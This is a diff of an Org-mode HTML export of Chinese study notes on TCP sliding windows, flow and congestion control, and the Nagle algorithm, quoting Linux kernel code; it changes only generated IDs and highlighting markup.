-<div id="outline-container-org24c8fdb" class="outline-3">
-<h3 id="org24c8fdb">滑动窗口</h3>
-<div class="outline-text-3" id="text-org24c8fdb">
+<div id="outline-container-orge9fecd7" class="outline-3">
+<h3 id="orge9fecd7">滑动窗口</h3>
+<div class="outline-text-3" id="text-orge9fecd7">
 <p>
 在一定的窗口大小内，无需等待确认应答，而可以继续发送数据的最大值。窗口的实现实际上是操作系统开辟的一个缓存空间，发送方主机在等到确认应答返回之前，必须在缓冲区中保留已发送的数据，如果按期收到确认应答，此时数据就可以从缓冲区清除。
 </p>
@@ -855,9 +854,9 @@ Window size scaling factor? 如果没有窗口因子，那窗口默认最大 64K
 </div>
 </div>
 
-<div id="outline-container-org05791e5" class="outline-3">
-<h3 id="org05791e5">流量控制</h3>
-<div class="outline-text-3" id="text-org05791e5">
+<div id="outline-container-orgbe2b6d7" class="outline-3">
+<h3 id="orgbe2b6d7">流量控制</h3>
+<div class="outline-text-3" id="text-orgbe2b6d7">
 <p>
 滑动窗口本质上是操作系统的缓冲区，会被操作系统调整。
 例如说上层应用没有及时从缓冲区读取数据，会造成接收窗口减少并通知发送方。这种情况下可能导致窗口会收缩为 0 ，即窗口关闭，发送方会定时发送窗口探测报文，以便知道接受方的窗口是否发生了改变。
@@ -889,9 +888,9 @@ Window size scaling factor? 如果没有窗口因子，那窗口默认最大 64K
 </div>
 </div>
 
-<div id="outline-container-orgc5c5a37" class="outline-3">
-<h3 id="orgc5c5a37">拥塞控制</h3>
-<div class="outline-text-3" id="text-orgc5c5a37">
+<div id="outline-container-org3bef729" class="outline-3">
+<h3 id="org3bef729">拥塞控制</h3>
+<div class="outline-text-3" id="text-org3bef729">
 <p>
 在网络出现拥堵时，如果继续发送⼤量数据包，可能会导致数据包时延、丢失等，这时 TCP 就会重传数据，但是⼀重传就会导致⽹络的负担更重，于是会导致更⼤的延迟以及更多的丢包，这个情况就会进⼊恶性循环被不断地放⼤。
 </p>
@@ -913,9 +912,9 @@ Window size scaling factor? 如果没有窗口因子，那窗口默认最大 64K
 </ul>
 </div>
 
-<div id="outline-container-org66d6337" class="outline-4">
-<h4 id="org66d6337">慢启动</h4>
-<div class="outline-text-4" id="text-org66d6337">
+<div id="outline-container-org936af2c" class="outline-4">
+<h4 id="org936af2c">慢启动</h4>
+<div class="outline-text-4" id="text-org936af2c">
 <p>
 TCP 连接在刚建立完成后，首先进入慢启动阶段，一点一点提高发送数据包的数量：当发送方每收到一个 ACK ，拥塞窗口 <code>cwnd</code> 就加 1 。拥塞窗口呈指数增长。
 慢启动阈值 <code>ssthresh(slow start threshold)</code> ，小于此值使用慢启动算法，大于等于此值使用拥塞避免算法。
@@ -923,26 +922,27 @@ TCP 连接在刚建立完成后，首先进入慢启动阶段，一点一点提�
 </div>
 </div>
 
-<div id="outline-container-orgc77d2a6" class="outline-4">
-<h4 id="orgc77d2a6">拥塞避免</h4>
-<div class="outline-text-4" id="text-orgc77d2a6">
+<div id="outline-container-orge0759f7" class="outline-4">
+<h4 id="orge0759f7">拥塞避免</h4>
+<div class="outline-text-4" id="text-orge0759f7">
 <p>
 一般 <code>ssthresh</code> 的大小是 65535 字节，进入拥塞避免阶段，每当收到一个 ACK 时， <code>cwnd</code> 增加 <code>1/cwnd</code> ，也就是要收到 <code>cwnd</code> 个 ACK ，能才增加 1 <code>cwnd/MSS</code> 。此时拥塞窗口呈线性增长。
 </p>
 </div>
 </div>
 
-<div id="outline-container-orgd20c0df" class="outline-4">
-<h4 id="orgd20c0df">拥塞发生</h4>
-<div class="outline-text-4" id="text-orgd20c0df">
+<div id="outline-container-org45575d4" class="outline-4">
+<h4 id="org45575d4">拥塞发生</h4>
+<div class="outline-text-4" id="text-org45575d4">
 <p>
 重传机制：超时重传和快速重传。
 超时重传时：
 </p>
-<pre class="example">
-ssthresh = cwnd / 2
+<div class="org-src-container">
+<pre class="src src-nil">ssthresh = cwnd / 2
 cwnd = 1
 </pre>
+</div>
 <p>
 相当于此时 TCP 重新进入慢启动阶段，数据流剧烈减少。
 </p>
@@ -950,19 +950,20 @@ cwnd = 1
 <p>
 快速重传时：
 </p>
-<pre class="example">
-cwnd = cwnd / 2
+<div class="org-src-container">
+<pre class="src src-nil">cwnd = cwnd / 2
 ssthresh = cwnd
 </pre>
+</div>
 <p>
 进入快速恢复过程。快速重传就是接收方连续发送 3 个 ACK ，发送方接收到后开始重传，因为接受到了 3 个 ACK ，所以接收方可以认为此时的网络不是特别槽糕， <code>cwnd</code> 窗口减半。
 </p>
 </div>
 </div>
 
-<div id="outline-container-orgadd5744" class="outline-4">
-<h4 id="orgadd5744">快速恢复</h4>
-<div class="outline-text-4" id="text-orgadd5744">
+<div id="outline-container-orgaebbc32" class="outline-4">
+<h4 id="orgaebbc32">快速恢复</h4>
+<div class="outline-text-4" id="text-orgaebbc32">
 <p>
 在快速重传已经改变 <code>cwnd</code> 和 <code>ssthresh</code> 的基础上：
 </p>
@@ -983,13 +984,13 @@ ssthresh = cwnd
 </div>
 </div>
 </div>
-<div id="outline-container-org13b7504" class="outline-2">
-<h2 id="org13b7504">TCP 的一些算法</h2>
-<div class="outline-text-2" id="text-org13b7504">
+<div id="outline-container-org5268bc1" class="outline-2">
+<h2 id="org5268bc1">TCP 的一些算法</h2>
+<div class="outline-text-2" id="text-org5268bc1">
 </div>
-<div id="outline-container-org39d5146" class="outline-3">
-<h3 id="org39d5146">Nagle</h3>
-<div class="outline-text-3" id="text-org39d5146">
+<div id="outline-container-org902dea3" class="outline-3">
+<h3 id="org902dea3">Nagle</h3>
+<div class="outline-text-3" id="text-org902dea3">
 <p>
 小包：包长度小于 MSS 的包；
 大包：包长度等于 MSS 的包。
@@ -997,57 +998,57 @@ ssthresh = cwnd
 Linux Kernel 3.4.4:
 </p>
 <div class="org-src-container">
-<pre class="src src-c"><span style="color: #8D8D84; font-style: italic;">// Filename : \linux-3.4.4\net\ipv4\tcp_output.c:1384</span>
-<span style="color: #8D8D84; font-style: italic;">/* Return 0, if packet can be sent now without violation Nagle's rules:</span>
+<pre class="src src-c"><span style="color: #8D8D84;">// </span><span style="color: #8D8D84; font-style: italic;">Filename : \linux-3.4.4\net\ipv4\tcp_output.c:1384</span>
+<span style="color: #8D8D84;">/* </span><span style="color: #8D8D84; font-style: italic;">Return 0, if packet can be sent now without violation Nagle's rules:</span>
 <span style="color: #8D8D84; font-style: italic;"> * 1. It is full sized.</span>
 <span style="color: #8D8D84; font-style: italic;"> * 2. Or it contains FIN. (already checked by caller)</span>
 <span style="color: #8D8D84; font-style: italic;"> * 3. Or TCP_CORK is not set, and TCP_NODELAY is set.</span>
 <span style="color: #8D8D84; font-style: italic;"> * 4. Or TCP_CORK is not set, and all sent packets are ACKed.</span>
 <span style="color: #8D8D84; font-style: italic;"> *    With Minshall's modification: all sent small packets are ACKed.</span>
-<span style="color: #8D8D84; font-style: italic;"> */</span>
-<span style="color: #0000FF;">static</span> <span style="color: #0000FF;">inline</span> <span style="color: #006FE0;">int</span> <span style="color: #006699;">tcp_nagle_check</span><span style="color: #707183; background-color: #FFFFFF;">(</span><span style="color: #0000FF;">const</span> <span style="color: #0000FF;">struct</span> <span style="color: #6434A3;">tcp_sock</span> <span style="color: #0000FF;">*</span><span style="color: #BA36A5;">tp</span><span style="color: #333333; background-color: #FFFFFF;">,</span>
-                  <span style="color: #0000FF;">const</span> <span style="color: #0000FF;">struct</span> <span style="color: #6434A3;">sk_buff</span> <span style="color: #0000FF;">*</span><span style="color: #BA36A5;">skb</span><span style="color: #333333; background-color: #FFFFFF;">,</span>
-                  <span style="color: #006FE0;">unsigned</span> <span style="color: #BA36A5;">mss_now</span><span style="color: #333333; background-color: #FFFFFF;">,</span> <span style="color: #006FE0;">int</span> <span style="color: #BA36A5;">nonagle</span><span style="color: #707183; background-color: #FFFFFF;">)</span>
-<span style="color: #707183; background-color: #FFFFFF;">{</span>
-    <span style="color: #0000FF;">return</span> skb<span style="color: #0000FF;">-&gt;</span><span style="color: #D0372D; font-style: italic;">len</span> <span style="color: #0000FF;">&lt;</span> mss_now <span style="color: #0000FF;">&amp;&amp;</span> <span style="color: #8D8D84; font-style: italic;">// &#25968;&#25454;&#38271;&#24230;&#19981;&#22815;</span>
-        <span style="color: #7388D6; background-color: #FFFFFF;">(</span><span style="color: #909183; background-color: #FFFFFF;">(</span>nonagle <span style="color: #0000FF;">&amp;</span> <span style="color: #D0372D;">TCP_NAGLE_CORK</span><span style="color: #909183; background-color: #FFFFFF;">)</span> <span style="color: #0000FF;">||</span> <span style="color: #8D8D84; font-style: italic;">// &#26410;&#24320;&#21551; nagle &#26102;&#20869;&#26680;&#21152;&#22622;(cork)&#20102;</span>
-         <span style="color: #909183; background-color: #FFFFFF;">(</span><span style="color: #0000FF;">!</span>nonagle <span style="color: #0000FF;">&amp;&amp;</span> tp<span style="color: #0000FF;">-&gt;</span><span style="color: #D0372D; font-style: italic;">packets_out</span> <span style="color: #0000FF;">&amp;&amp;</span> <span style="color: #006DAF;">tcp_minshall_check</span><span style="color: #709870; background-color: #FFFFFF;">(</span>tp<span style="color: #709870; background-color: #FFFFFF;">)</span><span style="color: #909183; background-color: #FFFFFF;">)</span><span style="color: #7388D6; background-color: #FFFFFF;">)</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
-         <span style="color: #8D8D84; font-style: italic;">// &#24320;&#21551;&#20102; nagle &#19988;&#27809;&#26377;&#26410;&#30830;&#35748;&#30340;&#23567;&#21253;</span>
-         <span style="color: #8D8D84; font-style: italic;">// &#36820;&#22238; 1 &#34920;&#31034;&#19981;&#31435;&#21363;&#21457;&#36865;&#65292;&#24773;&#20917;&#26159;</span>
-         <span style="color: #8D8D84; font-style: italic;">// 1. &#38271;&#24230;&#19981;&#22815; &#19988; &#21152;&#22622;</span>
-         <span style="color: #8D8D84; font-style: italic;">// 2. &#38271;&#24230;&#19981;&#22815; &#19988; &#24320;&#21551;&#20102; nagle &#19988; &#26377;&#26410;&#34987;&#30830;&#35748;&#30340;&#23567;&#21253;</span>
-         <span style="color: #8D8D84; font-style: italic;">// tp-&gt;packets_out &#20026;&#30495;&#34920;&#31034;&#23384;&#22312;&#26410;&#34987;&#30830;&#35748;&#30340;&#21253;</span>
-         <span style="color: #8D8D84; font-style: italic;">// tcp_minshall_check &#20026;&#30495;&#34920;&#31034;&#23384;&#22312;&#26410;&#34987;&#30830;&#35748;&#30340;&#23567;&#21253;&#65288;&#25913;&#36827;&#65289;</span>
-         <span style="color: #8D8D84; font-style: italic;">// tcp_minshall_check: \linux-3.4.4\net\ipv4\tcp_output.c:1378</span>
-<span style="color: #707183; background-color: #FFFFFF;">}</span>
+<span style="color: #8D8D84;"> */</span>
+<span style="color: #0000FF;">static</span> <span style="color: #0000FF;">inline</span> <span style="color: #6434A3;">int</span> <span style="color: #006699;">tcp_nagle_check</span>(<span style="color: #0000FF;">const</span> <span style="color: #0000FF;">struct</span> <span style="color: #6434A3;">tcp_sock</span> *<span style="color: #BA36A5;">tp</span>,
+                  <span style="color: #0000FF;">const</span> <span style="color: #0000FF;">struct</span> <span style="color: #6434A3;">sk_buff</span> *<span style="color: #BA36A5;">skb</span>,
+                  <span style="color: #6434A3;">unsigned</span> <span style="color: #BA36A5;">mss_now</span>, <span style="color: #6434A3;">int</span> <span style="color: #BA36A5;">nonagle</span>)
+{
+    <span style="color: #0000FF;">return</span> skb-&gt;len &lt; mss_now &amp;&amp; <span style="color: #8D8D84;">// </span><span style="color: #8D8D84; font-style: italic;">&#25968;&#25454;&#38271;&#24230;&#19981;&#22815;</span>
+        ((nonagle &amp; TCP_NAGLE_CORK) || <span style="color: #8D8D84;">// </span><span style="color: #8D8D84; font-style: italic;">&#26410;&#24320;&#21551; nagle &#26102;&#20869;&#26680;&#21152;&#22622;(cork)&#20102;</span>
+         (!nonagle &amp;&amp; tp-&gt;packets_out &amp;&amp; tcp_minshall_check(tp)));
+         <span style="color: #8D8D84;">// </span><span style="color: #8D8D84; font-style: italic;">&#24320;&#21551;&#20102; nagle &#19988;&#27809;&#26377;&#26410;&#30830;&#35748;&#30340;&#23567;&#21253;</span>
+         <span style="color: #8D8D84;">// </span><span style="color: #8D8D84; font-style: italic;">&#36820;&#22238; 1 &#34920;&#31034;&#19981;&#31435;&#21363;&#21457;&#36865;&#65292;&#24773;&#20917;&#26159;</span>
+         <span style="color: #8D8D84;">// </span><span style="color: #8D8D84; font-style: italic;">1. &#38271;&#24230;&#19981;&#22815; &#19988; &#21152;&#22622;</span>
+         <span style="color: #8D8D84;">// </span><span style="color: #8D8D84; font-style: italic;">2. &#38271;&#24230;&#19981;&#22815; &#19988; &#24320;&#21551;&#20102; nagle &#19988; &#26377;&#26410;&#34987;&#30830;&#35748;&#30340;&#23567;&#21253;</span>
+         <span style="color: #8D8D84;">// </span><span style="color: #8D8D84; font-style: italic;">tp-&gt;packets_out &#20026;&#30495;&#34920;&#31034;&#23384;&#22312;&#26410;&#34987;&#30830;&#35748;&#30340;&#21253;</span>
+         <span style="color: #8D8D84;">// </span><span style="color: #8D8D84; font-style: italic;">tcp_minshall_check &#20026;&#30495;&#34920;&#31034;&#23384;&#22312;&#26410;&#34987;&#30830;&#35748;&#30340;&#23567;&#21253;&#65288;&#25913;&#36827;&#65289;</span>
+         <span style="color: #8D8D84;">// </span><span style="color: #8D8D84; font-style: italic;">tcp_minshall_check: \linux-3.4.4\net\ipv4\tcp_output.c:1378</span>
+}
 
-<span style="color: #8D8D84; font-style: italic;">/* Return non-zero if the Nagle test allows this packet to be</span>
+<span style="color: #8D8D84;">/* </span><span style="color: #8D8D84; font-style: italic;">Return non-zero if the Nagle test allows this packet to be</span>
 <span style="color: #8D8D84; font-style: italic;"> * sent now.</span>
-<span style="color: #8D8D84; font-style: italic;"> */</span>
-<span style="color: #0000FF;">static</span> <span style="color: #0000FF;">inline</span> <span style="color: #006FE0;">int</span> <span style="color: #006699;">tcp_nagle_test</span><span style="color: #707183; background-color: #FFFFFF;">(</span><span style="color: #0000FF;">const</span> <span style="color: #0000FF;">struct</span> <span style="color: #6434A3;">tcp_sock</span> <span style="color: #0000FF;">*</span><span style="color: #BA36A5;">tp</span><span style="color: #333333; background-color: #FFFFFF;">,</span> <span style="color: #0000FF;">const</span> <span style="color: #0000FF;">struct</span> <span style="color: #6434A3;">sk_buff</span> <span style="color: #0000FF;">*</span><span style="color: #BA36A5;">skb</span><span style="color: #333333; background-color: #FFFFFF;">,</span>
-                 <span style="color: #006FE0;">unsigned int</span> <span style="color: #BA36A5;">cur_mss</span><span style="color: #333333; background-color: #FFFFFF;">,</span> <span style="color: #006FE0;">int</span> <span style="color: #BA36A5;">nonagle</span><span style="color: #707183; background-color: #FFFFFF;">)</span>
-<span style="color: #707183; background-color: #FFFFFF;">{</span>
-    <span style="color: #8D8D84; font-style: italic;">/* Nagle rule does not apply to frames, which sit in the middle of the</span>
+<span style="color: #8D8D84;"> */</span>
+<span style="color: #0000FF;">static</span> <span style="color: #0000FF;">inline</span> <span style="color: #6434A3;">int</span> <span style="color: #006699;">tcp_nagle_test</span>(<span style="color: #0000FF;">const</span> <span style="color: #0000FF;">struct</span> <span style="color: #6434A3;">tcp_sock</span> *<span style="color: #BA36A5;">tp</span>, <span style="color: #0000FF;">const</span> <span style="color: #0000FF;">struct</span> <span style="color: #6434A3;">sk_buff</span> *<span style="color: #BA36A5;">skb</span>,
+                 <span style="color: #6434A3;">unsigned</span> <span style="color: #6434A3;">int</span> <span style="color: #BA36A5;">cur_mss</span>, <span style="color: #6434A3;">int</span> <span style="color: #BA36A5;">nonagle</span>)
+{
+    <span style="color: #8D8D84;">/* </span><span style="color: #8D8D84; font-style: italic;">Nagle rule does not apply to frames, which sit in the middle of the</span>
 <span style="color: #8D8D84; font-style: italic;">     * write_queue (they have no chances to get new data).</span>
 <span style="color: #8D8D84; font-style: italic;">     *</span>
 <span style="color: #8D8D84; font-style: italic;">     * This is implemented in the callers, where they modify the 'nonagle'</span>
 <span style="color: #8D8D84; font-style: italic;">     * argument based upon the location of SKB in the send queue.</span>
-<span style="color: #8D8D84; font-style: italic;">     */</span>
-    <span style="color: #0000FF;">if</span> <span style="color: #7388D6; background-color: #FFFFFF;">(</span>nonagle <span style="color: #0000FF;">&amp;</span> <span style="color: #D0372D;">TCP_NAGLE_PUSH</span><span style="color: #7388D6; background-color: #FFFFFF;">)</span>
-        <span style="color: #0000FF;">return</span> <span style="color: #D0372D;">1</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
+<span style="color: #8D8D84;">     */</span>
+    <span style="color: #0000FF;">if</span> (nonagle &amp; TCP_NAGLE_PUSH)
+        <span style="color: #0000FF;">return</span> <span style="color: #D0372D;">1</span>;
 
-    <span style="color: #8D8D84; font-style: italic;">/* Don't use the nagle rule for urgent data (or for the final FIN).</span>
+    <span style="color: #8D8D84;">/* </span><span style="color: #8D8D84; font-style: italic;">Don't use the nagle rule for urgent data (or for the final FIN).</span>
 <span style="color: #8D8D84; font-style: italic;">     * Nagle can be ignored during F-RTO too (see RFC4138).</span>
-<span style="color: #8D8D84; font-style: italic;">     */</span>
-    <span style="color: #0000FF;">if</span> <span style="color: #7388D6; background-color: #FFFFFF;">(</span><span style="color: #006DAF;">tcp_urg_mode</span><span style="color: #909183; background-color: #FFFFFF;">(</span>tp<span style="color: #909183; background-color: #FFFFFF;">)</span> <span style="color: #0000FF;">||</span> <span style="color: #909183; background-color: #FFFFFF;">(</span>tp<span style="color: #0000FF;">-&gt;</span><span style="color: #D0372D; font-style: italic;">frto_counter</span> <span style="color: #0000FF;">==</span> <span style="color: #D0372D;">2</span><span style="color: #909183; background-color: #FFFFFF;">)</span> <span style="color: #0000FF;">||</span>
-        <span style="color: #909183; background-color: #FFFFFF;">(</span><span style="color: #006DAF;">TCP_SKB_CB</span><span style="color: #709870; background-color: #FFFFFF;">(</span>skb<span style="color: #709870; background-color: #FFFFFF;">)</span><span style="color: #0000FF;">-&gt;</span><span style="color: #D0372D; font-style: italic;">tcp_flags</span> <span style="color: #0000FF;">&amp;</span> <span style="color: #D0372D;">TCPHDR_FIN</span><span style="color: #909183; background-color: #FFFFFF;">)</span><span style="color: #7388D6; background-color: #FFFFFF;">)</span>
-        <span style="color: #0000FF;">return</span> <span style="color: #D0372D;">1</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
+<span style="color: #8D8D84;">     */</span>
+    <span style="color: #0000FF;">if</span> (tcp_urg_mode(tp) || (tp-&gt;frto_counter == <span style="color: #D0372D;">2</span>) ||
+        (TCP_SKB_CB(skb)-&gt;tcp_flags &amp; TCPHDR_FIN))
+        <span style="color: #0000FF;">return</span> <span style="color: #D0372D;">1</span>;
 
-    <span style="color: #0000FF;">if</span> <span style="color: #7388D6; background-color: #FFFFFF;">(</span><span style="color: #0000FF;">!</span><span style="color: #006DAF;">tcp_nagle_check</span><span style="color: #909183; background-color: #FFFFFF;">(</span>tp<span style="color: #333333; background-color: #FFFFFF;">,</span> skb<span style="color: #333333; background-color: #FFFFFF;">,</span> cur_mss<span style="color: #333333; background-color: #FFFFFF;">,</span> nonagle<span style="color: #909183; background-color: #FFFFFF;">)</span><span style="color: #7388D6; background-color: #FFFFFF;">)</span>
-        <span style="color: #0000FF;">return</span> <span style="color: #D0372D;">1</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
+    <span style="color: #0000FF;">if</span> (!tcp_nagle_check(tp, skb, cur_mss, nonagle))
+        <span style="color: #0000FF;">return</span> <span style="color: #D0372D;">1</span>;
 
-    <span style="color: #0000FF;">return</span> <span style="color: #D0372D;">0</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
-<span style="color: #707183; background-color: #FFFFFF;">}</span>
+    <span style="color: #0000FF;">return</span> <span style="color: #D0372D;">0</span>;
+}
 </pre>
 </div>
 
@@ -1062,68 +1063,70 @@ MSS 为 1000 时，到达 1000, 600, 600 三个数据块，后续暂时没有其
 <p>
 一般 TCP 发包的流程：
 </p>
-<pre class="example">
-tcp_push() -&gt; __tcp_push_pending_frames() -&gt; tcp_write_xmit()
+<div class="org-src-container">
+<pre class="src src-nil">tcp_push() -&gt; __tcp_push_pending_frames() -&gt; tcp_write_xmit()
 </pre>
+</div>
 
 <p>
 而如果所有发出去的数据包都已经确认并且有数据包等待发送，会导致调用 <code>tcp_check_probe_timer()</code> ：
 </p>
-<pre class="example">
-tcp_probe_timer() -&gt; tcp_send_probe0() -&gt; tcp_write_wakeup() -&gt; tcp_transmit_skb()
+<div class="org-src-container">
+<pre class="src src-nil">tcp_probe_timer() -&gt; tcp_send_probe0() -&gt; tcp_write_wakeup() -&gt; tcp_transmit_skb()
 </pre>
+</div>
 <p>
 从而绕过 Nagle 和 <code>TCP_CORK</code> ，既然反正是要发一个数据包（零窗口探测包），如果有实际数据等待发送，那么干脆就直接发送一个负载等待发送数据的数据包岂不是更好。
 </p>
 </div>
 
-<div id="outline-container-orgd22da6c" class="outline-4">
-<h4 id="orgd22da6c">改进的 Nagle - Minshall</h4>
-<div class="outline-text-4" id="text-orgd22da6c">
+<div id="outline-container-org7d9eebc" class="outline-4">
+<h4 id="org7d9eebc">改进的 Nagle - Minshall</h4>
+<div class="outline-text-4" id="text-org7d9eebc">
 <p>
 确保在一个 RTT 内只有一个当前连接的小包，可以在一定程度上的缓解因为 Nagle 和 DelayAck 同时开启时奇数小包阻塞的问题。
 </p>
 <div class="org-src-container">
-<pre class="src src-c"><span style="color: #0000FF;">static</span> <span style="color: #0000FF;">inline</span> <span style="color: #006FE0;">int</span> <span style="color: #006699;">tcp_minshall_check</span><span style="color: #707183; background-color: #FFFFFF;">(</span><span style="color: #0000FF;">const</span> <span style="color: #0000FF;">struct</span> <span style="color: #6434A3;">tcp_sock</span> <span style="color: #0000FF;">*</span><span style="color: #BA36A5;">tp</span><span style="color: #707183; background-color: #FFFFFF;">)</span>
-<span style="color: #707183; background-color: #FFFFFF;">{</span>
-    <span style="color: #6434A3;">reutrn</span> <span style="color: #006699;">after</span><span style="color: #7388D6; background-color: #FFFFFF;">(</span><span style="color: #6434A3;">tp</span><span style="color: #0000FF;">-&gt;</span><span style="color: #BA36A5;">snd_sml</span><span style="color: #333333; background-color: #FFFFFF;">,</span> <span style="color: #6434A3;">tp</span><span style="color: #0000FF;">-&gt;</span><span style="color: #BA36A5;">snd_una</span><span style="color: #7388D6; background-color: #FFFFFF;">)</span> <span style="color: #0000FF;">&amp;&amp;</span>
-        <span style="color: #0000FF;">!</span><span style="color: #006DAF;">after</span><span style="color: #7388D6; background-color: #FFFFFF;">(</span>tp<span style="color: #0000FF;">-&gt;</span><span style="color: #D0372D; font-style: italic;">snd_sml</span><span style="color: #333333; background-color: #FFFFFF;">,</span> tp<span style="color: #0000FF;">-&gt;</span><span style="color: #D0372D; font-style: italic;">snd_nxt</span><span style="color: #7388D6; background-color: #FFFFFF;">)</span><span style="color: #333333; background-color: #FFFFFF;">;</span>
-<span style="color: #707183; background-color: #FFFFFF;">}</span>
+<pre class="src src-c"><span style="color: #0000FF;">static</span> <span style="color: #0000FF;">inline</span> <span style="color: #6434A3;">int</span> <span style="color: #006699;">tcp_minshall_check</span>(<span style="color: #0000FF;">const</span> <span style="color: #0000FF;">struct</span> <span style="color: #6434A3;">tcp_sock</span> *<span style="color: #BA36A5;">tp</span>)
+{
+    <span style="color: #6434A3;">reutrn</span> <span style="color: #006699;">after</span>(tp-&gt;snd_sml, tp-&gt;snd_una) &amp;&amp;
+        !after(tp-&gt;snd_sml, tp-&gt;snd_nxt);
+}
 </pre>
 </div>
 
 
-<figure id="orgfe894ae">
+<figure id="org6720b8c">
 <img src="../images/tcp_nagle_minshall.png" alt="tcp_nagle_minshall.png">
 
 </figure>
 </div>
 </div>
 </div>
-<div id="outline-container-org4481dc9" class="outline-3">
-<h3 id="org4481dc9">Delayed Acknowledgment</h3>
+<div id="outline-container-org10af302" class="outline-3">
+<h3 id="org10af302">Delayed Acknowledgment</h3>
 </div>
-<div id="outline-container-orgeba869c" class="outline-3">
-<h3 id="orgeba869c">Per-Host PASW(Protect Against Wrapped Sequences)</h3>
+<div id="outline-container-org16fbefa" class="outline-3">
+<h3 id="org16fbefa">Per-Host PASW(Protect Against Wrapped Sequences)</h3>
 </div>
-<div id="outline-container-org77863ab" class="outline-3">
-<h3 id="org77863ab">SYN Cookies</h3>
-</div>
-</div>
-<div id="outline-container-orga829934" class="outline-2">
-<h2 id="orga829934">Port Detection&#xa0;&#xa0;&#xa0;<span class="tag"><span class="security">security</span></span></h2>
-<div class="outline-text-2" id="text-orga829934">
-</div>
-<div id="outline-container-orgc5f6f57" class="outline-3">
-<h3 id="orgc5f6f57">hping3</h3>
-</div>
-<div id="outline-container-org146e98d" class="outline-3">
-<h3 id="org146e98d">nmap</h3>
+<div id="outline-container-org8b35260" class="outline-3">
+<h3 id="org8b35260">SYN Cookies</h3>
 </div>
 </div>
-<div id="outline-container-orgaae50a7" class="outline-2">
-<h2 id="orgaae50a7">Reference</h2>
-<div class="outline-text-2" id="text-orgaae50a7">
+<div id="outline-container-org8ab86cd" class="outline-2">
+<h2 id="org8ab86cd">Port Detection&#xa0;&#xa0;&#xa0;<span class="tag"><span class="security">security</span></span></h2>
+<div class="outline-text-2" id="text-org8ab86cd">
+</div>
+<div id="outline-container-org2ce9c85" class="outline-3">
+<h3 id="org2ce9c85">hping3</h3>
+</div>
+<div id="outline-container-orgb876e49" class="outline-3">
+<h3 id="orgb876e49">nmap</h3>
+</div>
+</div>
+<div id="outline-container-org04ddabe" class="outline-2">
+<h2 id="org04ddabe">Reference</h2>
+<div class="outline-text-2" id="text-org04ddabe">
 <ul class="org-ul">
 <li>图解网络-小林coding-v3.0.pdf</li>
 </ul>
